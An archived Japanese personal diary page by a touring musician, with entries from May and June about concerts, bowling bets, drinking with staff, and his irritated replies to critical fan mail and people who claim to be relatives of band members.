<!--This file created 19:52  00/06/23 by Claris Home Page version 2.0J-->
<HTML>
<HEAD>
   <TITLE>chibinikki4</TITLE>
   <META NAME=GENERATOR CONTENT="Claris Home Page 2.0J">
   <META HTTP-EQUIV="Content-Type" CONTENT="text/html;CHARSET=x-sjis">
   <X-SAS-WINDOW TOP=29 BOTTOM=431 LEFT=16 RIGHT=642>
</HEAD>
<BODY BGCOLOR="#FFFFFF" ALINK="#0000FF" VLINK="#0000FF">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/www.jah.ne.jp\/~oresama\/chibi\/chibinikki4.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "16";
var displayMonth = "Jun";
var displayYear = "2008";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://www.jah.ne.jp/~oresama/chibi/chibinikki4.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20080616185350" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20080415043600/http://www.jah.ne.jp/~oresama/chibi/chibinikki4.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="15 Apr 2008"><strong>APR</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 18:53:50 Jun 16, 2008">JUN</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Jul
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20080517134601/http://www.jah.ne.jp/~oresama/chibi/chibinikki4.htm" title="13:46:01 May 17, 2008" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 18:53:50 Jun 16, 2008">16</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_nxt_off.png" width="14" alt="Next capture" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20041217160722/http://www.jah.ne.jp/~oresama/chibi/chibinikki4.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="17 Dec 2004"><strong>2004</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 18:53:50 Jun 16, 2008">2008</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2009
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20080616185350*/http://www.jah.ne.jp/~oresama/chibi/chibinikki4.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>11 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">4 May 03 - 16 Jun 08</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:000000000000_2003:-1:000010000101_2004:-1:010100010101_2005:-1:000000000000_2006:-1:000000000000_2007:-1:000000000000_2008:5:000111000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->


<P><FONT SIZE="-1"><A HREF="/web/20080616185350/http://www.jah.ne.jp/~oresama/chibi/kindex.html">戻る</A></FONT></P>

<P><CENTER><B><FONT SIZE="+2">ちび日記</FONT></B></CENTER></P>

<P ALIGN=RIGHT><FONT
SIZE="-1"><A HREF="/web/20080616185350/http://www.jah.ne.jp/~oresama/chibi/chibinikki3.htm">１９９９年の日記</A></FONT><FONT
SIZE="-1">
<HR>
</FONT></P>

<P><CENTER><FONT SIZE="-1">６月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">やっぱり来たよ。お馴染みの反発メールが（苦笑）<BR>

「そんな人ばかりじゃありません」<BR>

「頑張ってる人たちもいるんです」<BR>

そんなことくらい知ってるよ。<BR>

俺ってそんなにバカにみえるのかな？<BR>

でもな、自分達のキャンパスをあれだけ汚くしていて誰も何にもしないんだぞ？<BR>

治外法権きどってやりたい放題だ。<BR>

「ここは創造する場所」俺に言った奴がいた。<BR>

カラオケで他人の作った歌を熱唱して、どこかで聞いたような言葉吐いて…。<BR>

壁の落書きは低俗だし、イラストはアニメだ。<BR>

それが創造なのか？<BR>

まず掃除機から作れよ（笑）<BR>

「この場所は営利目的では使えません」<BR>

それを言った奴は最後まで俺様と眼を合わせなかったよ。<BR>

これが日本最高峰の大学かと思うと情けなくなるのも仕方なくないか？<BR>

たった２、３行の俺様の言葉に過剰に反応してヒステリックなメールを送りつけるのはガキじゃないのか？<BR>

学校というヌルいシステムに守られてるのを自覚したほうがイイと思うぜ？<BR>

社会人１０年生の俺様でした（笑）
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">“はちべえ”に乗りまくり。<BR>

オイルも交換したから走りもビンビン！<BR>

でも、またしばらく乗れないんだよね。<BR>

しょぼん。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">某大学（超有名）でロケ。<BR>

なんか大学生ってこんなもんか？って思った。<BR>

なんぼ勉強が出来てもしょせんガキだな。<BR>

進学が目的…なんてセコイんだろう。<BR>

行き止まりを感じたよ。<BR>

<BR>

やっと食べたかったラーメンを食べた。<BR>

でも何事も期待しすぎはよくないね。<BR>

だってガッカリしちゃったから（笑）<BR>

不味くはなかったんだけどね。
<HR>
６月某日<BR>

<BR>

直政はナオマサと読むに決まってるだろう！<BR>

ナオスケは安政の大獄の人やっちうねん！<BR>

だいたい時代が違うだろ。<BR>

コンニャロ〜！<BR>

以上、フリガナを間違えた事務所のねえちゃんに対する怒りでした（笑）
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">一生のうちにどれだけの人を好きになるんだろう？<BR>

その気持ちを何人に伝えるんだろう？<BR>

伝えられた人はどうするんだろう？<BR>

その後どうなるんだろう？<BR>

有効期限付きの「愛してる」<BR>

賞味期限付きの「愛される人」
<HR>
-俺がやりたかったこと-<BR>

<BR>

二年半前、初めてインターネットの世界に触れた。<BR>

驚いた。同時に感動もした。<BR>

そこでは名も知らない同志が少しずつ、ゆっくりと関係を深めていた。<BR>

まだ利用者も少ない頃だったから新参者も歓迎されていた。<BR>

無知なゆえのマナー違反もやさしく諭されていた。<BR>

「ホームページ」…まさに“家”だった。<BR>

家の主人は訪問者をもてなし、客も礼儀を守った。<BR>

そんな世界に憧れた。<BR>

早速パソコンを買った。<BR>

「トモダチがもっと増えるかも…」本気で思った。<BR>

でも、俺の正体を明かすわけにはいかない。<BR>

トモダチになるのには時間がかかってしまうだろうから。<BR>

だからハンドルネームを考えた。<BR>

それが“俺様”だった。<BR>

我ながらフザけたHNだと笑った。<BR>

でも、いざとなると俺様と名乗って他のサイトに書込んだりチャットに参加することが出来なかった。<BR>

愉快犯になることを恐れた。<BR>

もし仲良くなれても正体を明かせないのならツマラナイ。<BR>

途中でバレて騒がれるのもイヤだ。<BR>

だったら自分でHPを作ろう！<BR>

知る人ぞ知る“俺様”になろう！<BR>

誰だかわからないけど妙に威張ってる“俺様”という人物に。<BR>

正体がわかっても困らないくらいのおバカなHPを作ろう！<BR>

俺からは出向かないかわりに“誰でも入れる家”を作ろう！<BR>

すぐに制作に取りかかった。<BR>

HP名は「俺様！」。<BR>

俺のためのHPだから。<BR>

コンテンツは…。<BR>

特に意味のないものにした。<BR>

見ても何の得にもならないけどニヤッとしてしまうように変な文をたくさん書いた。<BR>

来てくれた人が気楽に楽しめるように俺の日常も書いた。<BR>

でもあくまで匿名の世界だから具体的な内容は伏せた。<BR>

BBSも設置した。<BR>

でも俺の家だから伝言板としての使用を禁止し“書込処”とした。<BR>

これでみんなの日常や気持ちもわかるし、個々の交流の場が出来た。<BR>

「俺様！」なりのルールも考えた。<BR>

一番の基本的ルールは“お互い、必要以上に干渉しないこと”だ。<BR>

俺はここでは“俺様”だから。<BR>

もし俺が何者かわかっても詮索しないことを暗黙のルールとした。<BR>

メールの返事もしないし書込みに対する返事もしない。<BR>

そのかわり全部に目を通す。<BR>

これによって一定の距離を保つことにした。<BR>

馴れ合いはロクな結果を生まないからだ。<BR>

こうして「俺様！」をOPENした。<BR>

みんなとゆっくりゆっくり仲良くなるために…。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">毎日たくさんのメールがくる。<BR>

みんなが俺のことを考えてくれている。<BR>

それは正直に嬉しく思う。<BR>

ありがとう。<BR>

<BR>

でもな、“俺のことを考える”＝“俺のために頑張ってる”と勘違いしてないか？<BR>

みんな励ましの内容のメールだ。<BR>

自分勝手な内容が多いけどね。<BR>

「あなたの出した答えなら受け入れます」<BR>

といった“言葉”がほとんどだ。<BR>

でも、言葉は違うが結局「やめないでよ、私の楽しみが一つ減るから」<BR>

という“内容”ばかりだ。<BR>

ヒステリックに「やめちゃえば！？」ってヤツもいるけどな。<BR>

誰が「やめる」なんて言ったんだ？<BR>

俺はそんなことは一言も言ってないぞ？<BR>

見当違いな憶測でモノを語るなよ。<BR>

「書込処」が故障したとき、俺がワザとやったと思ったヤツいるだろ？<BR>

本当は機械の故障なのに何も調べもせず俺を疑ったヤツいるだろ？<BR>

簡単なルールくらい守れよ。<BR>

「伝言板に使うな！」と言っているのに伝言板にしてるヤツいるだろ？<BR>

「俺は“俺様”だ」と言っているのに違う名前を書くヤツいるだろ？<BR>

<BR>

みんなは俺が「俺様！」で何がやりたかったか考えたことがあるかい？<BR>

俺は結局、自分で自分の首を絞めていたみたいだな。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">書込処がヘンだ。<BR>

閲覧ができなくなってる。<BR>

これは俺様がやったんぢゃねえぞ。<BR>

気付いたらこうなってたんだ。<BR>

原因はよくわからねえ。<BR>

元通りに治す努力はするがいつになるかはわからん。<BR>

早めになんとかするよ。</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今、考えてるよ。<BR>

いろんな事をな。<BR>

いろいろな選択肢が俺にはある。<BR>

どれを選んでも後悔はしない。<BR>

その結果に対して俺を見損なってくれてもかまわない。<BR>

俺は他人のせいにするつもりもない。<BR>

全ては俺が招いた事だから。<BR>

でも、俺は常に前を向いてるよ。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">もう、何を書いていいのかわからない。<BR>

こんな事を書くとまたいろいろ言われるんだろうな。<BR>

“やりたかったこと”は何だっけ？…。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">友人達とボウリング。<BR>

今回も俺様の勝利！<BR>

最近、呑み代が安くあがっていいね（笑）
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">東京に戻り、早速仕事。<BR>

某P誌の連載の仕事。<BR>

これをみんな見てくれているのかな？<BR>

内容的には興味がなければ面白くないとは思うけどね（苦笑）
<HR>
６月山梨</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">K・Mが風邪を引いた。<BR>

熱が強力に出ている。<BR>

リハ前に病院へ。<BR>

まあ、長いツアーだからこういう日もあるさ。<BR>

気合をいれて、いざ本番！<BR>

…、ライヴは楽しいんだよ。それは嘘じゃない。<BR>

でも、もう俺の望んでいるカタチじゃない。<BR>

俺のハートは届いているかい？<BR>

気持ちがすれ違っている気がして…。<BR>

俺が贅沢すぎるのかな？<BR>

表面上の“楽しい”だけで満足すればいいのかな？<BR>

俺はもっともっと上の景色が見たい。
<HR>
６月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昼頃起きだし、パチンコへ。<BR>

裏モノのスロットを発見し打つ。<BR>

こいつが爆発して大勝ち。<BR>

やっぱスロットは裏モノに限るな。
<HR>
６月大宮</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今ツアー二度目の埼玉。<BR>

初日との違いを見せつけよう！<BR>

……、ライヴは楽しいんだけどな…。<BR>

ステージにいる俺達は客席にいる全員に話し掛けている。<BR>

全員に投げかけている。<BR>

それを忘れないでほしい。<BR>

<BR>

終了後、ダミアン達と焼肉屋へ。<BR>

ここの塩ホルモンは絶品だ。<BR>

この店で食べたら他の店のホルモンがニセモノに思える。<BR>

それ程美味い。<BR>

またまた朝までコース（笑）
<HR>
５月郡山</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">なんてヤンキーが多いんだ（笑）<BR>

男の子のパワーが凄い。<BR>

過去最高ぢゃないか？
<HR>
５月山形</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ステージが狭い。<BR>

天井も低い。<BR>

こういう場所は暑くて嫌いだ。<BR>

案の定、本番中に軽い日射病になった。<BR>

盛り上がれば盛り上がるほど体調が悪くなるのが悔しい。<BR>

でも最後まできっちりキメたぞ。<BR>

やはり男は気合だな。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">山形入り。<BR>

今日も呑み代を賭けたボウリング大会だ。<BR>

今回は８人の大人数なのでますます負けられない。<BR>

接戦が予想されたが意外にも若手のスコアが伸びず、楽勝。<BR>

今日の呑み代ゴチになります！（笑）<BR>

ちなみに俺様のスコアは１４９。<BR>

まあまあだな。<BR>

２時頃までしっかり呑んでホテルに戻る。<BR>

部屋でスタッフと真面目な話をして明日に備える。<BR>

俺様の仲間は良いヤツばかりだな。
<HR>
俺達を“どこぞの巨大な遊園地のネズミ”か何かと勘違いしてねえか？<BR>

俺達のステージは夢の世界じゃねえ。<BR>

俺達は笑顔しかない“着ぐるみ”じゃねえ。<BR>

こんなことを叫んでもどうにもならねえのが腹立つ。
<HR>
５月青森</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">楽しかった。<BR>

こんなに機材トラブルやハプニングの多いステージも珍しい。<BR>

そのおかげで、ますます燃えたし忘れかけていたモノを思い出した。<BR>

やっぱり俺達のステージは何が起きるかわからんな（笑）
<HR>
５月岩手　Y・A　HAPPY BIRTHDAY</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">楽しかった。<BR>

やりやすい会場ではなかったけど、気分的に楽しかった。<BR>

でも、やっぱり違和感がある。<BR>

岩手に限らず、このところずっと感じてる違和感だ。<BR>

実は原因も理由も分かっている。<BR>

プラスαの要因もあるだろうが。<BR>

なんとかしたいけど、なんともなんねえんだろうな。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">盛山移動。<BR>

昼飯に冷麺を食べる。<BR>

いや〜、冷麺って美味いね。ゴムみたいだけど（笑）<BR>

食後、パチンコへ。<BR>

激負けも裏モノスロットで大逆転。<BR>

さらにゲーム代を賭けたボウリングでも勝利。<BR>

今日はツイてるぜ！<BR>

やっぱ勝負は勝たなきゃな。
<HR>
５月秋田</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">１週間ぶりのライヴ。<BR>

気合は充分だ。<BR>

東北地方のスタートだしな。<BR>

本番、俺達的にはがむばった。<BR>

流れも表現も気持ちも良かったと思う。<BR>

でも一方通行な感じがした。<BR>

学生の頃の文化祭みたいな感じかな。<BR>

ライヴに慣れてないせいもあるだろうが…。<BR>

俺達、っていうか俺様はただキャーキャー言われても嬉しくないんだよ。<BR>

そういう楽しみ方もあるんだろうが…。<BR>

俺はもっとハートで受け止めて欲しいんだ。<BR>

年齢の差なのかな？<BR>

俺はアイドルには向いてねえよ。←っていうか“おっさん”だし（笑）
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">なんでいつも被害者なんだろう？<BR>

なんでそんなに簡単に傷つくんだろう？<BR>

その前に「傷ついた」なんてそんなに簡単に口にすることか？<BR>

傷は消えるし癒える。傷跡は残ってもな。<BR>

消えない傷は“不治の病”だ。<BR>

その時点で“傷”じゃない。<BR>

もう一つ、「心配した」と言う人がいる。<BR>

“心配”とは“心を配る”と書く。<BR>

心を配るのだ。<BR>

“配って”いるのだ。<BR>

“売って”いるワケじゃないんだぞ。<BR>

欲しがっている人に“あげて”いるワケでもないんだぞ。<BR>

むしろ“心の無料配布”なんだ。<BR>

路上のティッシュ配りが貰ってくれない人に文句言えるか？<BR>

貰ってくれた人に感謝はしても文句を言う筋合いはないだろう？<BR>

貰ってくれない人に「受け取れ！」って言うのはただのインネンじゃないか？<BR>

押し売りと変わらない。<BR>

人が貰いたくなるような“心”を配りたいよな。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">そんなつもりぢゃなかったんだけどよ。<BR>

でも、みんなありがとよ。</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">ちなみに俺様のボウリング・アベレージは１５０だ。<BR>

球は１５ポンドだ。<BR>

最高スコア２００ぐらいかな。<BR>

結構やるだろ？（笑）
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">なんか疲れた。<BR>

俺達の音は聴こえているか？<BR>

俺達の声は届いているか？<BR>

俺は本当に存在して…。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">最近、“親戚ネタ”“親類ネタ”もしくは“彼女ネタ”のメールが多くて閉口している。<BR>

「私はメンバーの親類の友達の従妹です」<BR>

だからなんなんだよ？<BR>

そういえば、そうやって楽屋まで入ってきた奴らが昔いたな。<BR>

「私はメンバーの彼女です」<BR>

ってライヴ会場にタダで入ろうとした馬鹿もいたな。<BR>

それに「俺、メンバーの親類なんだ」と、FANに声をかける奴もいたな。<BR>

だからなんなんだ？<BR>

俺達の親類だったらなんなんだ？<BR>

俺のおじいちゃんが死んだとき、俺を見るために親戚（かなり遠い）が集まった。<BR>

それがムカツイて俺はおじいちゃんの葬式にも出られなかった。<BR>

最近、初めて会った親戚もいた。<BR>

俺と同じ年くらいの女性の親戚なんて存在すら知らなかったぞ。<BR>

昔からよく知ってる人やお世話になった人ならともかく、遠すぎる親戚に親戚ヅラされたくねえよ。<BR>

それに俺と関係のある奴らはそんなことを軽々しく口にはしないんだよ。<BR>

ハイエナよりタチが悪いぜ！
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">若手スタッフとボウリング。<BR>

今回も敗者は全額払いだ。<BR>

ビールを呑みながらの勝負。<BR>

なかなか良い勝負だったが後半、集中力の差で俺様の勝利。<BR>

その後、ゲーセンでまたまた盛り上がる。<BR>

最近のゲームは大掛かりで楽しいな。<BR>

金が掛かり過ぎだけど。<BR>

また近いうちに遊ぼう。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">某CバンドのTと、事務所のAさんと呑む。<BR>

鉄板焼きをツマミに懐かしい話で盛り上がる。<BR>

ちょっと呑ませ過ぎちゃったかな？（笑）
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">若手スタッフと呑みに行く。<BR>

コイツがまたよく食べる。<BR>

結局、かなりの出費。<BR>

もう、朝だぜ。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">友人たちとボウリング。<BR>

負けた奴がゲーム代全額払うペナルティ付き。<BR>

２ゲーム目、俺様と友人Kの一騎打ち。<BR>

俺様の高スコアもKのターキー（三回連続ストライク）に敗れる。<BR>

ちくしょう！ひどいよな、８フレまでは俺様がリードしてたのに…。<BR>

しょぼ〜ん。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">最近、またまた批判メール、もしくは批難メールが多い。<BR>

なんなんだ？俺様はお前等みんなを満足させなければならないのか？<BR>

顔も知らないお前等のことを？<BR>

だいたい俺様が個人にあてた内容を人前で公開するわけないだろう。<BR>

個人に言いたいことがあれば電話なりで直接言うよ。<BR>

俺様はメールで伝えることはしない。<BR>

日記はあくまで俺様の「つぶやき」なんだぞ。<BR>

過剰に反応するなよ。<BR>

批難の矛先が間違ってないかい？<BR>

批判の感情が生まれたら、それを言葉にする前に考えろよ。<BR>

勢いだけで文句いわれても聞こえないぜ。
<HR>
５月茨城</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日は「納豆の国」でライヴだ（笑）<BR>

俺様は納豆が大の苦手なのだ。<BR>

まあ、ライヴとは何の関係もないけどね。<BR>

本番のあの暑さはライヴハウスなみだった。<BR>

客席も盛り上がっていていい感じなのだが…。<BR>

ステージに向かって話し掛けすぎる。<BR>

場の雰囲気もわきまえずに話すから大事なところで話の腰を折られてしまう。<BR>

いいかい？こんなことで何度も注意させるなよ。<BR>

俺は学校の先生ぢゃないんだから。<BR>

<BR>

終了後、スタッフと「呑みに行こう！」と盛り上がってしまったため急遽、茨城に宿泊。<BR>

何軒か呑んで、最終的にお店がなくなり“デニ○ズ”で呑む。<BR>

もう外は明るいのに俺たちのテーブルだけ大盛り上がり（笑）<BR>

俺たちって呑めればどこでもいいのね。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「持てるモノと落としてしまうモノ、どれほどの重さがちがうのだろう？」<BR>

「落としてしまうモノ」は一度は“持てた”のだからそれほど重さは違わないのだろう。<BR>

少なくとも持てない程の重さではない。<BR>

それに“捨てた”のではななく“落とした”のだから自発的ではない。<BR>

抱えたときに、しっかりと腕の中に残るものと落ちてしまうものの差だろう。<BR>

自分の不注意で落としてしまうのなら落とさない抱え方もあるだろう。<BR>

もしくは自分では抱えきれないものを持とうとした結果、持ちきれなかったのかもしれない。<BR>

それなら“落とさなかったもの”は軽いから落ちなかったのか？<BR>

“落としたモノ”は重かったから落ちたのか？<BR>

軽いものを集めた１００ｋｇを抱えるのと、一つで１００ｋｇのものを抱えるのと何が違う？<BR>

俺は欲張りだから出来るだけたくさん持ちたい。<BR>

今、１００ｋｇしか持てないならもっともっと体（ココロ）を鍛えてたくさん持てるようになりたい。<BR>

もっともっと強くなりたい。
<HR>
